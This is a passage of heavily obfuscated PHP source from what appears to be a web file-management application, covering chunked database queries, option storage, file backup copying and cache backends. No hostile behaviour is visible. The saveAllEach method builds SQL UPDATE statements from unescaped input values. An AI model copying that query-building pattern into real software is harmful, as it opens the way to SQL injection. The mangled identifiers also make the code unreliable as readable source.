= "\125\120\104\x41\124\x45\x20\140{$¸ª°Ó—·}\140\x20\x53\x45\x54\40{$·›½ØÉö[2]}\x20\x3d\40\103\101\x53\105\40{$·›½ØÉö[0]}\x20\xa"; if ($õ´’ÚÀ– == 0) { $Ä©¾şÜÓ = $†ÇÕ«²à; } $¼˜í‰[] = $³ïÌ˜Æ°[118] . $·›½ØÉö[1] . $³ïÌ˜Æ°[118]; $õ´’ÚÀ–++; $Ä©¾şÜÓ .= "\40\x57\110\x45\x4e\40\x27{$·›½ØÉö[1]}\47\40\124\x48\105\x4e\x20\47{$·›½ØÉö[3]}\47\40\xa"; if ($õ´’ÚÀ– == $ØĞûî || $Õí„œìŠ == $Ù‰ªÉ£ - 1) { $¸­¶¥… = implode($³ïÌ˜Æ°[50], $¼˜í‰); $Ä©¾şÜÓ .= "\x20\x45\116\x44\x20\x20\x57\x48\x45\x52\x45\x20{$·›½ØÉö[0]}\x20\111\x4e\40\x28{$¸­¶¥…}\x29\x20"; $this->execute($Ä©¾şÜÓ); $õ´’ÚÀ– = 0; $Ä©¾şÜÓ = $†ÇÕ«²à; $this->chunkEventCheck(count($¼˜í‰)); $¼˜í‰ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ı§Ò…™â) { $‹ÕéÊè¤ =& $_SERVER[Ó¡Ÿ§‚]; $¶¹ŠÃ« = $this->tablePrefix . $this->tableName; foreach ($ı§Ò…™â as $»Ù¸ÈÍä) { if (!is_array($»Ù¸ÈÍä) || count($»Ù¸ÈÍä) != 4) { continue; } $Åù¸¾òá = $»Ù¸ÈÍä[0] . $‹ÕéÊè¤[379] . $»Ù¸ÈÍä[1] . $‹ÕéÊè¤[118]; $¾¾¨Õİ = $»Ù¸ÈÍä[2] . $‹ÕéÊè¤[379] . $»Ù¸ÈÍä[3] . $‹ÕéÊè¤[118]; $Ã€¥â°Â = "\x75\160\x64\x61\x74\x65\x20{$¶¹ŠÃ«}\40\163\145\x74\x20{$¾¾¨Õİ}\40\167\150\x65\x72\x65\40{$Åù¸¾òá}\73"; $this->execute($Ã€¥â°Â); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Øş¢¤Å£ = false, $“„ÆÛöß = false) { $this->_chunkEvent = $Øş¢¤Å£; $this->_chunkEventParam = $“„ÆÛöß; } private function chunkEventCheck($âšÜÀÃ¹) { if (!$this->_chunkEvent) { return; } $Ğˆ‚âıÍ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ğˆ‚âıÍ[$_SERVER[Ó¡Ÿ§‚][380]] = $âšÜÀÃ¹; Hook::trigger($this->_chunkEvent, $Ğˆ‚âıÍ); } public function addAll($ËÂ¿…“, $Íî³ÚÚŠ = array(), $Õíİè = false) { $“Œ¹ÏÅƒ =& $_SERVER[Ó¡Ÿ§‚]; ignore_timeout(); $¯€ĞÕøÚ = self::SQL_WHERE_IN_CHUNK; if (empty($ËÂ¿…“)) { $this->error = think_lang($“Œ¹ÏÅƒ[271]); return !1; } $Íî³ÚÚŠ = $this->_parseOptions($Íî³ÚÚŠ); foreach ($ËÂ¿…“ as $Û¼‚³Ä¯ => $®–¶ á) { $ËÂ¿…“[$Û¼‚³Ä¯] = $this->_facade($®–¶ á); $this->_beforeInsert($ËÂ¿…“[$Û¼‚³Ä¯], $Íî³ÚÚŠ); } if (method_exists($this->db, $“Œ¹ÏÅƒ[272])) { for ($–Óä½®¦ = 0; $–Óä½®¦ < count($ËÂ¿…“); $–Óä½®¦ += $¯€ĞÕøÚ) { $¬ş¿œØ  = array_slice($ËÂ¿…“, $–Óä½®¦, $¯€ĞÕøÚ); if (!is_array($¬ş¿œØ ) || count($¬ş¿œØ ) == 0) { break; } $ÏŒúü—ˆ = $this->db->insertAll($¬ş¿œØ , $Íî³ÚÚŠ, $Õíİè); $this->chunkEventCheck(count($¬ş¿œØ )); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ËÂ¿…“ as $Û¼‚³Ä¯ => $®–¶ á) { $ÏŒúü—ˆ = $this->db->insert($®–¶ á, $Íî³ÚÚŠ, $Õíİè); } $this->commit(); } if (!1 !== $ÏŒúü—ˆ) { $±Çó© = $this->getLastInsID(); if ($±Çó©) { return $±Çó©; } } return $ÏŒúü—ˆ; } public function save($“„Ò„˜ø = '', $üæŞË¨ú = array()) { $™ÜºÃğ =& $_SERVER[Ó¡Ÿ§‚]; $Ãú»ú£ = self::SQL_WHERE_IN_CHUNK; $¡™ÏÔ = $this->optionsValue(); $Ã™»™©× = $this->findWhereField($¡™ÏÔ); if (!$Ã™»™©×) { return parent::save($“„Ò„˜ø, $üæŞË¨ú); } $²İâÇ• = 0; $’Ÿà•ëü = $¡™ÏÔ[$™ÜºÃğ[275]][$Ã™»™©×][1]; $’Ÿà•ëü = is_array($’Ÿà•ëü) ? $’Ÿà•ëü : array(); $Ûó¢î¾Ç = count($’Ÿà•ëü); for ($ÁÜæ„ú’ = 0; $ÁÜæ„ú’ < $Ûó¢î¾Ç; $ÁÜæ„ú’ += $Ãú»ú£) { $©Ìğ€¬ø = array_slice($’Ÿà•ëü, $ÁÜæ„ú’, $Ãú»ú£); if (!is_array($©Ìğ€¬ø) || count($©Ìğ€¬ø) == 0) { break; } $¡™ÏÔ[$™ÜºÃğ[275]][$Ã™»™©×][1] = $©Ìğ€¬ø; $this->optionsValue($¡™ÏÔ); $²İâÇ• += parent::save($“„Ò„˜ø, $üæŞË¨ú); $this->chunkEventCheck(count($©Ìğ€¬ø)); } $this->chunkEventSet(); return $²İâÇ•; } public function add($«Å¤‘Æ = '', $üµŒßáã = array(), $‡Æòøù˜ = false) { if ($this->addTaskStatus && is_array($«Å¤‘Æ)) { $this->addTaskData[] = $«Å¤‘Æ; return; } return parent::add($«Å¤‘Æ, $üµŒßáã, $‡Æòøù˜); } public function parseWhereLike($Ú¾¹ÍÑ, $†ø»ï×ù = '', $§õó¡Ÿä = false, &$àêÆ³Øã = false) { $áÙ¶‡„ß =& $_SERVER[Ó¡Ÿ§‚]; $Ñ‚ß¹ã = $GLOBALS[$áÙ¶‡„ß[6]][$áÙ¶‡„ß[381]]; if (!$Ñ‚ß¹ã[$áÙ¶‡„ß[382]]) { return $Ú¾¹ÍÑ; } if (!is_array($Ú¾¹ÍÑ)) { return $Ú¾¹ÍÑ; } $Ûò‘ØÍ = array(); $ùùÓ‰‰ = 0; foreach ($Ú¾¹ÍÑ as $ÈË©¬µ => $ıÈÖ÷ƒ«) { if (is_array($ıÈÖ÷ƒ«) && count($ıÈÖ÷ƒ«) == 2 && $ıÈÖ÷ƒ«[0] == $áÙ¶‡„ß[383] && is_string($ıÈÖ÷ƒ«[1]) && substr($ıÈÖ÷ƒ«[1], 0, 1) == $áÙ¶‡„ß[384] && substr($ıÈÖ÷ƒ«[1], strlen($ıÈÖ÷ƒ«[1]) - 1, 1) == $áÙ¶‡„ß[384]) { $àêÆ³Øã = !0; $œœıí‰˜ = is_string($ÈË©¬µ) ? $ÈË©¬µ : $†ø»ï×ù; $¼Ë—È¡ = substr($ıÈÖ÷ƒ«[1], 1, strlen($ıÈÖ÷ƒ«[1]) - 2); $¼Ë—È¡ = $this->db->escapeString($¼Ë—È¡); if (!strpos($œœıí‰˜, $áÙ¶‡„ß[10])) { $œœıí‰˜ = $áÙ¶‡„ß[385] . $œœıí‰˜ . $áÙ¶‡„ß[385]; } $¾¸ı©àÒ = $áÙ¶‡„ß[189] . $¼Ë—È¡ . $áÙ¶‡„ß[189]; $¼Ë—È¡ = str_replace(array($áÙ¶‡„ß[10], $áÙ¶‡„ß[386], $áÙ¶‡„ß[11]), $áÙ¶‡„ß[387], $¼Ë—È¡); if ($Ñ‚ß¹ã[$áÙ¶‡„ß[388]]) { $¾¸ı©àÒ = $áÙ¶‡„ß[389] . $¼Ë—È¡ . $áÙ¶‡„ß[390]; if ($Ñ‚ß¹ã[$áÙ¶‡„ß[391]]) { $¾¸ı©àÒ = $áÙ¶‡„ß[390] . $¼Ë—È¡ . $áÙ¶‡„ß[389]; } } $Ûò‘ØÍ[$ùùÓ‰‰] = $áÙ¶‡„ß[392] . $œœıí‰˜ . $áÙ¶‡„ß[393] . $¾¸ı©àÒ . $áÙ¶‡„ß[394]; $ùùÓ‰‰++; continue; } if (is_array($ıÈÖ÷ƒ«)) { $†ø»ï×ù = is_string($ÈË©¬µ) ? $ÈË©¬µ : $†ø»ï×ù; $ıÈÖ÷ƒ« = $this->parseWhereLike($ıÈÖ÷ƒ«, $†ø»ï×ù, !0, $àêÆ³Øã); } if (is_numeric($ÈË©¬µ)) { $Ûò‘ØÍ[$ùùÓ‰‰] = $ıÈÖ÷ƒ«; $ùùÓ‰‰++; } else { $Ûò‘ØÍ[$ÈË©¬µ] = $ıÈÖ÷ƒ«; } } if ($àêÆ³Øã && !$§õó¡Ÿä) { } return $Ûò‘ØÍ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($İò‹øÃÈ = array()) { $¬ëÈéêˆ =& $_SERVER[Ó¡Ÿ§‚]; $ÙÄ²íœ× = self::SQL_WHERE_IN_CHUNK; $ë‘ß²şç = $this->optionsValue(); $¤àää†˜ = $this->findWhereField($ë‘ß²şç); if (!$¤àää†˜ || isset($ë‘ß²şç[$¬ëÈéêˆ[292]]) || isset($ë‘ß²şç[$¬ëÈéêˆ[353]])) { return parent::select($İò‹øÃÈ); } $¹ŸÍœ = $ë‘ß²şç[$¬ëÈéêˆ[275]][$¤àää†˜][1]; $¹ŸÍœ = is_array($¹ŸÍœ) ? $¹ŸÍœ : array(); $µŠæÇ‡ = null; for ($˜œ‹ëß = 0; $˜œ‹ëß < count($¹ŸÍœ); $˜œ‹ëß += $ÙÄ²íœ×) { $’ªÈêœé = array_slice($¹ŸÍœ, $˜œ‹ëß, $ÙÄ²íœ×); if (!is_array($’ªÈêœé) || count($’ªÈêœé) == 0) { break; } $ë‘ß²şç[$¬ëÈéêˆ[275]][$¤àää†˜][1] = $’ªÈêœé; $this->optionsValue($ë‘ß²şç); $ûÂ—áÔ© = parent::select($İò‹øÃÈ); if (!$ûÂ—áÔ©) { continue; } $µŠæÇ‡ = is_array($µŠæÇ‡) ? $µŠæÇ‡ : array(); $µŠæÇ‡ = array_merge($µŠæÇ‡, $ûÂ—áÔ©); } return $µŠæÇ‡; } public function delete($»½³ğÒ™ = array()) { $¿æ³Èè® =& $_SERVER[Ó¡Ÿ§‚]; $¼¥¸¼øŠ = self::SQL_WHERE_IN_CHUNK; $ÜËéó¼† = $this->optionsValue(); $òÀ§âŠ— = $this->findWhereField($ÜËéó¼†); if (!$òÀ§âŠ—) { return parent::delete($»½³ğÒ™); } $ƒ…Í‚ˆŠ = 0; $ôöä¶¸ğ = $ÜËéó¼†[$¿æ³Èè®[275]][$òÀ§âŠ—][1]; $ôöä¶¸ğ = is_array($ôöä¶¸ğ) ? $ôöä¶¸ğ : array(); for ($³ôŠŠÁµ = 0; $³ôŠŠÁµ < count($ôöä¶¸ğ); $³ôŠŠÁµ += $¼¥¸¼øŠ) { $ïÚŸÈÖ = array_slice($ôöä¶¸ğ, $³ôŠŠÁµ, $¼¥¸¼øŠ); if (!is_array($ïÚŸÈÖ) || count($ïÚŸÈÖ) == 0) { break; } $ÜËéó¼†[$¿æ³Èè®[275]][$òÀ§âŠ—][1] = $ïÚŸÈÖ; $this->optionsValue($ÜËéó¼†); $ƒ…Í‚ˆŠ += parent::delete($»½³ğÒ™); } return $ƒ…Í‚ˆŠ; } private function findWhereField($‰×äüĞ ) { $û¡‹é†ê =& $_SERVER[Ó¡Ÿ§‚]; $–Ÿíß¨ = self::SQL_WHERE_IN_CHUNK; if (!is_array($‰×äüĞ ) || !is_array($‰×äüĞ [$û¡‹é†ê[275]])) { return !1; } foreach ($‰×äüĞ [$û¡‹é†ê[275]] as $§«Ğ¼Š× => $ê­ª¢£­) { if (is_array($ê­ª¢£­) && isset($ê­ª¢£­[0]) && is_string($ê­ª¢£­[0]) && strtolower($ê­ª¢£­[0]) == $û¡‹é†ê[7] && is_array($ê­ª¢£­[1]) && count($ê­ª¢£­[1]) > $–Ÿíß¨) { ignore_timeout(); return $§«Ğ¼Š×; } } return !1; } public function setMasterDB($µŸæòšó = true) { think_config($_SERVER[Ó¡Ÿ§‚][395], $µŸæòšó); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\117\x70\x74\151\x6f\156"; public $field = array(); public function listData($¹—¿€ßÎ = false, $ã‰¦™Û = "\155\157\x64\151\146\x79\124\x69\155\145", $ÒÁ‚®òÈ = false) { $²µÖäÜø = Model($this->modelType)->get(!1, $this->optionType, !0); $¢‚±²Ä = array_values($²µÖäÜø); if ($¢‚±²Ä && $¢‚±²Ä[0] && !is_array($¢‚±²Ä[0])) { Model($this->modelType)->cacheRemove($this->optionType); $²µÖäÜø = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$²µÖäÜø) { return $¹—¿€ßÎ ? null : array(); } if (!$¹—¿€ßÎ) { $²µÖäÜø = array_filter(array_values($²µÖäÜø)); return array_sort_by($²µÖäÜø, $ã‰¦™Û, $ÒÁ‚®òÈ); } return $²µÖäÜø[$_SERVER[Ó¡Ÿ§‚][396] . $¹—¿€ßÎ]; } public function insert($ºÒ¾»öß) { $·ÙüóÓ =& $_SERVER[Ó¡Ÿ§‚]; $ºÒ¾»öß = array_field_key($ºÒ¾»öß, $this->field); $âÁ¡Çë¡ = Model($this->modelType)->get($·ÙüóÓ[397], $this->optionType . $·ÙüóÓ[398]); $âÁ¡Çë¡ = $âÁ¡Çë¡ ? $âÁ¡Çë¡ : 0; $ºÒ¾»öß[$·ÙüóÓ[399]] = ++$âÁ¡Çë¡; $ºÒ¾»öß[$·ÙüóÓ[201]] = time(); $ºÒ¾»öß[$·ÙüóÓ[85]] = time(); Model($this->modelType)->set($·ÙüóÓ[397], $âÁ¡Çë¡, $this->optionType . $·ÙüóÓ[398]); Model($this->modelType)->set($·ÙüóÓ[396] . $âÁ¡Çë¡, $ºÒ¾»öß, $this->optionType); return $âÁ¡Çë¡; } public function update($¦ÒÜíÆÔ, $æ†ğŒ–†) { $®“Šô…ß =& $_SERVER[Ó¡Ÿ§‚]; $æ†ğŒ–† = array_field_key($æ†ğŒ–†, $this->field); $Î·–¡İ¹ = $this->listData($¦ÒÜíÆÔ); if (!$Î·–¡İ¹ || !$¦ÒÜíÆÔ) { return !1; } $æ†ğŒ–† = array_merge($Î·–¡İ¹, $æ†ğŒ–†); $æ†ğŒ–†[$®“Šô…ß[85]] = time(); return Model($this->modelType)->set($®“Šô…ß[396] . $¦ÒÜíÆÔ, $æ†ğŒ–†, $this->optionType); } public function remove($Ú®„¤Öô) { if (!$Ú®„¤Öô) { return !1; } return Model($this->modelType)->remove($_SERVER[Ó¡Ÿ§‚][396] . $Ú®„¤Öô, $this->optionType); } public function clear() { $·şù†ú§ =& $_SERVER[Ó¡Ÿ§‚]; Model($this->modelType)->remove($·şù†ú§[397], $this->optionType . $·şù†ú§[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($îÑàè·, $ˆŞ«‹ç) { if (!$ˆŞ«‹ç) { return !1; } $†ùñ¾¿˜ = $this->listData(); $†ùñ¾¿˜ = array_to_keyvalue($†ùñ¾¿˜, $îÑàè·); return isset($†ùñ¾¿˜[$ˆŞ«‹ç]) ? $†ùñ¾¿˜[$ˆŞ«‹ç] : !1; } public function findByName($Ê¾™ª©¦) { return $this->findByKey($_SERVER[Ó¡Ÿ§‚][32], $Ê¾™ª©¦); } protected function resetData($Õç‡•ø) { $ÏúƒÕ¡ =& $_SERVER[Ó¡Ÿ§‚]; $Õç‡•ø = is_array($Õç‡•ø) ? $Õç‡•ø : array(); $¼¤çÂ²â = array(); for ($³¥–Ãğé = 0; $³¥–Ãğé < count($Õç‡•ø); $³¥–Ãğé++) { $¼¤çÂ²â[$ÏúƒÕ¡[396] . $Õç‡•ø[$³¥–Ãğé][$ÏúƒÕ¡[399]]] = $Õç‡•ø[$³¥–Ãğé]; } return Model($this->modelType)->set($¼¤çÂ²â, !1, $this->optionType); } private function getAutoName($Éú“•­·) { $•ûôêéì = array_to_keyvalue($this->listData(), $_SERVER[Ó¡Ÿ§‚][32]); if (!$•ûôêéì || !isset($•ûôêéì[$Éú“•­·])) { return $Éú“•­·; } for ($ªå§Î³ü = 1; $ªå§Î³ü < count($•ûôêéì); $ªå§Î³ü++) { $òÂ²£³é = $Éú“•­· . "\x28{$ªå§Î³ü}\x29"; if (!isset($•ûôêéì[$òÂ²£³é])) { return $òÂ²£³é; } } return $òÂ²£³é; } } goto AÑä›¯ä×Š; c†ø„Ûºˆ„: class BackupFile { public function __construct() { } public function index() { $”¢ª¥Í‘ = Backup::get(); $™¢Ç©Ôõ = $”¢ª¥Í‘[$_SERVER[Ó¡Ÿ§‚][293]][$_SERVER[Ó¡Ÿ§‚][200]][$_SERVER[Ó¡Ÿ§‚][477]]; $ıÙÍ»Ü„ = array($_SERVER[Ó¡Ÿ§‚][478] => array($_SERVER[Ó¡Ÿ§‚][806], $™¢Ç©Ôõ), $_SERVER[Ó¡Ÿ§‚][807] => array($_SERVER[Ó¡Ÿ§‚][331], $”¢ª¥Í‘[$_SERVER[Ó¡Ÿ§‚][750]])); $×í‚íí’ = (int) Model($_SERVER[Ó¡Ÿ§‚][788])->where($ıÙÍ»Ü„)->count($_SERVER[Ó¡Ÿ§‚][477]); $ñË‘µÀ = (int) Model($_SERVER[Ó¡Ÿ§‚][788])->where($ıÙÍ»Ü„)->sum($_SERVER[Ó¡Ÿ§‚][76]); $³…Öè¬‰ = new TaskFileTransfer($_SERVER[Ó¡Ÿ§‚][808], $_SERVER[Ó¡Ÿ§‚][779], $×í‚íí’, LNG($_SERVER[Ó¡Ÿ§‚][780]) . $_SERVER[Ó¡Ÿ§‚][781] . LNG($_SERVER[Ó¡Ÿ§‚][809])); $³…Öè¬‰->task[$_SERVER[Ó¡Ÿ§‚][762]] = $ñË‘µÀ; $ıøŠÉóÏ = array($_SERVER[Ó¡Ÿ§‚][810] => $×í‚íí’, $_SERVER[Ó¡Ÿ§‚][811] => $ñË‘µÀ, $_SERVER[Ó¡Ÿ§‚][812] => time()); Backup::set($ıøŠÉóÏ); $­çÓ = !0; $Ïå­…›¹ = $this->storeIds(); $ÓÇÖÖıñ = 1; $üŒÂ‚ÍÂ = 1000; $³´¦»è = $ÁÚà˜úÇ = 0; $«ÍäÛœ¿ = array(); $ú¢Áİ–Ç = $Ùïôïö‹ = 0; do { $›÷ÛŠúä = $_SERVER[Ó¡Ÿ§‚][813]; $®Ÿª¥€ = Model($_SERVER[Ó¡Ÿ§‚][788])->where($ıÙÍ»Ü„)->field($›÷ÛŠúä)->order($_SERVER[Ó¡Ÿ§‚][814])->selectPage($üŒÂ‚ÍÂ, $ÓÇÖÖıñ); $Ûóäõ»µ = !empty($®Ÿª¥€[$_SERVER[Ó¡Ÿ§‚][369]]) ? $®Ÿª¥€[$_SERVER[Ó¡Ÿ§‚][369]] : array(); foreach ($Ûóäõ»µ as $”üë±şÏ) { if (!$this->_fileExist($”üë±şÏ, $«ÍäÛœ¿, $Ïå­…›¹)) { $×í‚íí’ -= 1; $ñË‘µÀ -= (int) $”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][76]]; write_log("\x66\151\154\145\x20\156\157\164\40\x65\170\x69\x73\x74\x2e\x66\151\154\145\111\x44\x3a{$”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][477]]}\54\x20\x70\141\164\150\72{$”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][84]]}", $_SERVER[Ó¡Ÿ§‚][815]); continue; } $º­¹ôÇ• = $”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][84]]; $»ïùÀƒŸ = "\173\x69\157\x3a{$”¢ª¥Í‘[$_SERVER[Ó¡Ÿ§‚][750]]}\175" . substr($º­¹ôÇ•, strlen("\x7b\x69\x6f\72{$”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][816]]}\175")); if (IO::exist($»ïùÀƒŸ)) { $³…Öè¬‰->updateFileEnd($”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][32]], $”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][76]]); } else { $»ïùÀƒŸ = get_path_father($»ïùÀƒŸ); IO::mkdir($»ïùÀƒŸ); if (!IO::copy($º­¹ôÇ•, $»ïùÀƒŸ, $_SERVER[Ó¡Ÿ§‚][817])) { write_log($_SERVER[Ó¡Ÿ§‚][818] . $º­¹ôÇ• . $_SERVER[Ó¡Ÿ§‚][802] . $»ïùÀƒŸ . $_SERVER[Ó¡Ÿ§‚][164], $_SERVER[Ó¡Ÿ§‚][779]); $­çÓ = !1; break; } } $™¢Ç©Ôõ = $”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][477]]; $ÁÚà˜úÇ += 1; $³´¦»è += $”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][76]]; $Ùïôïö‹ += 1; $ú¢Áİ–Ç += $”üë±şÏ[$_SERVER[Ó¡Ÿ§‚][76]]; if ($³´¦»è >= 1024 * 1024 * 100) { $ıøŠÉóÏ = array($_SERVER[Ó¡Ÿ§‚][819] => $™¢Ç©Ôõ, $_SERVER[Ó¡Ÿ§‚][820] => $Ùïôïö‹, $_SERVER[Ó¡Ÿ§‚][821] => $ú¢Áİ–Ç); Backup::set($ıøŠÉóÏ); $³´¦»è = $ÁÚà˜úÇ = 0; } } $õşÌê‹· = count($Ûóäõ»µ); $ÓÇÖÖıñ++; } while ($õşÌê‹· == $üŒÂ‚ÍÂ); $³…Öè¬‰->end(); $ıøŠÉóÏ = array($_SERVER[Ó¡Ÿ§‚][822] => 1, $_SERVER[Ó¡Ÿ§‚][760] => time(), $_SERVER[Ó¡Ÿ§‚][774] => 1, $_SERVER[Ó¡Ÿ§‚][819] => $™¢Ç©Ôõ, $_SERVER[Ó¡Ÿ§‚][811] => $ñË‘µÀ, $_SERVER[Ó¡Ÿ§‚][810] => $×í‚íí’, $_SERVER[Ó¡Ÿ§‚][823] => time()); if ($ÁÚà˜úÇ) { $ıøŠÉóÏ[$_SERVER[Ó¡Ÿ§‚][820]] = $Ùïôïö‹; $ıøŠÉóÏ[$_SERVER[Ó¡Ÿ§‚][821]] = $ú¢Áİ–Ç; } Backup::set($ıøŠÉóÏ); $this->_fileFilter($«ÍäÛœ¿); return !0; } private function _fileExist($¼©óˆˆ†, &$áŞË ó¹, $™ÄÄò†ô) { $ß›«¨šì =& $_SERVER[Ó¡Ÿ§‚]; $€×›í‹Æ = $¼©óˆˆ†[$ß›«¨šì[84]]; if (in_array($¼©óˆˆ†[$ß›«¨šì[477]], $áŞË ó¹)) { return !1; } if (!in_array($¼©óˆˆ†[$ß›«¨šì[816]], $™ÄÄò†ô)) { return !1; } if (IO::exist($€×›í‹Æ)) { return !0; } $€¡–Ãã = get_path_father($€×›í‹Æ); if (IO::exist($€¡–Ãã)) { $áŞË ó¹[] = $¼©óˆˆ†[$ß›«¨šì[477]]; return !1; } $à¹©ìÈã = array($ß›«¨šì[816] => $¼©óˆˆ†[$ß›«¨šì[816]], $ß›«¨šì[84] => array($ß›«¨šì[383], "{$€¡–Ãã}\x25")); $²¡×ş¼ = Model($ß›«¨šì[788])->where($à¹©ìÈã)->field($ß›«¨šì[478])->select(); $áŞË ó¹ = array_merge($áŞË ó¹, array_to_keyvalue($²¡×ş¼, $ß›«¨šì[12], $ß›«¨šì[477])); return !1; } private function _fileFilter($„ÃùïÖ¼) { $ÒêæÈÂá =& $_SERVER[Ó¡Ÿ§‚]; if (empty($„ÃùïÖ¼)) { return; } $—”æ‰šû = array($ÒêæÈÂá[477] => array($ÒêæÈÂá[7], array_unique($„ÃùïÖ¼))); $ŸÆ³Ùòõ = Model($ÒêæÈÂá[824])->where($—”æ‰šû)->field($ÒêæÈÂá[411])->select(); foreach ($ŸÆ³Ùòõ as $²š¾¬Ì¦) { Model($ÒêæÈÂá[824])->remove($²š¾¬Ì¦[$ÒêæÈÂá[411]], !1); } } private function storeIds() { $¾Âş³û =& $_SERVER[Ó¡Ÿ§‚]; $Œ­¼şÜª = Model($¾Âş³û[766])->listData(); $©ÛÅõÍâ = array(); $ìôØ¨û = $GLOBALS[$¾Âş³û[6]][$¾Âş³û[89]][$¾Âş³û[825]]; foreach ($Œ­¼şÜª as $•ş™‡ø“) { $™Ÿˆ™îÒ = strtolower($•ş™‡ø“[$¾Âş³û[95]]); if (!isset($ìôØ¨û[$™Ÿˆ™îÒ])) { continue; } $êüœ‹•á = $¾Âş³û[74] . (isset($ìôØ¨û[$™Ÿˆ™îÒ]) ? $ìôØ¨û[$™Ÿˆ™îÒ] : ucfirst($™Ÿˆ™îÒ)); if (!class_exists($êüœ‹•á)) { continue; } $©ÛÅõÍâ[] = $•ş™‡ø“[$¾Âş³û[399]]; } return $©ÛÅõÍâ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¦Ê¶Âš‚ =& $_SERVER[Ó¡Ÿ§‚]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¯’¼ÜŠ€ = $GLOBALS[$¦Ê¶Âš‚[6]][$¦Ê¶Âš‚[349]]; $ÆÎñ´ï› = $¯’¼ÜŠ€[$¯’¼ÜŠ€[$¦Ê¶Âš‚[826]]]; $˜úÄ¹˜¤ = $¯’¼ÜŠ€[$¦Ê¶Âš‚[827]]; switch ($¯’¼ÜŠ€[$¦Ê¶Âš‚[826]]) { case $¦Ê¶Âš‚[21]: self::$handle = Model($¦Ê¶Âš‚[828]); break; case $¦Ê¶Âš‚[829]: self::$handle = new CacheRedis($ÆÎñ´ï›, $˜úÄ¹˜¤); break; case $¦Ê¶Âš‚[830]: self::$handle = new CacheMemcached($ÆÎñ´ï›, $˜úÄ¹˜¤); break; case $¦Ê¶Âš‚[200]: self::$handle = new CacheFile($ÆÎñ´ï›, $˜úÄ¹˜¤); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÀÎãÙ) { if (is_array($ÀÎãÙ) || is_object($ÀÎãÙ)) { $ÀÎãÙ = json_encode($ÀÎãÙ); } $ÀÎãÙ = rawurlencode($ÀÎãÙ); return md5(KOD_SITE_ID . $_SERVER[Ó¡Ÿ§‚][11] . $ÀÎãÙ); } public static function get($¢÷Œ…ğÌ, $¼™¶ãÈÏ = false) { $èÍ Ç§ = self::key($¢÷Œ…ğÌ); if ($¼™¶ãÈÏ) { return unserialize(self::init()->get($èÍ Ç§)); } if (!isset(self::$memoryCache[$èÍ Ç§])) { $ÛÁÆÊì = self::init()->get($èÍ Ç§); self::$memoryCache[$èÍ Ç§] = unserialize($ÛÁÆÊì); } return self::$memoryCache[$èÍ Ç§]; } public static function set($ÃÃœ‚, $€×öÕ”, $®×Ú¼¿° = false) { $ÚøáÖÓ = self::key($ÃÃœ‚); if (isset(self::$memoryCache[$ÚøáÖÓ]) && self::$memoryCache[$ÚøáÖÓ] === $€×öÕ”) { return !0; } if ($®×Ú¼¿° === 0) { self::$memoryCache[$ÚøáÖÓ] = $€×öÕ”; return !0; } CacheLock::lock($ÃÃœ‚); $‹¶¾ô²“ = self::init()->set($ÚøáÖÓ, serialize($€×öÕ”), $®×Ú¼¿°); self::$memoryCache[$ÚøáÖÓ] = $€×öÕ”; CacheLock::unlock($ÃÃœ‚); return $‹¶¾ô²“; } public static function getCall($êÒË´Å‡, $ãÁ‹˜Øî, $†ü®‹‡Ë, $ÖÀ«ò˜¤ = array()) { $íóØ›–˜ =& $_SERVER[Ó¡Ÿ§‚]; $ßâãâ ‹ = self::get($êÒË´Å‡); if ($ßâãâ ‹ || $ßâãâ ‹ === $íóØ›–˜[12]) { return $ßâãâ ‹; } $ßâãâ ‹ = call_user_func_array($†ü®‹‡Ë, $ÖÀ«ò˜¤); $ßâãâ ‹ = $ßâãâ ‹ ? $ßâãâ ‹ : $íóØ›–˜[12]; self::set($êÒË´Å‡, $ßâãâ ‹, $ãÁ‹˜Øî); return $ßâãâ ‹; } public static function remove($Ä×„´Ö©) { $·„éÃì‚ = self::key($Ä×„´Ö©); unset(self::$memoryCache[$·„éÃì‚]); self::clearTimeout(); CacheLock::lock($Ä×„´Ö©); $´Šè¨ğ = self::init()->remove($·„éÃì‚); CacheLock::unlock($Ä×„´Ö©); return $´Šè¨ğ; } public static function removeMemory($Ï„ÅöŸ¨) { $•¤íÏòÚ = self::key($Ï„ÅöŸ¨); unset(self::$memoryCache[$•¤íÏòÚ]); } public static function clearMemory($–¾şªı = false) { if ($–¾şªı) { $–¾şªı = self::key($–¾şªı); unset(self::$memoryCache[$–¾şªı]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ó¡Ÿ§‚][831])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ó¡Ÿ§‚][832])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¤ÛŞàÃ‰, $Ò“õö¹È) { $¢åâÙç =& $_SERVER[Ó¡Ÿ§‚]; $this->cachePath = $¤ÛŞàÃ‰[$¢åâÙç[84]]; $this->prefix = $¢åâÙç[833]; $this->cacheTime = $Ò“õö¹È; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‡µ¥ËÇ‡) { 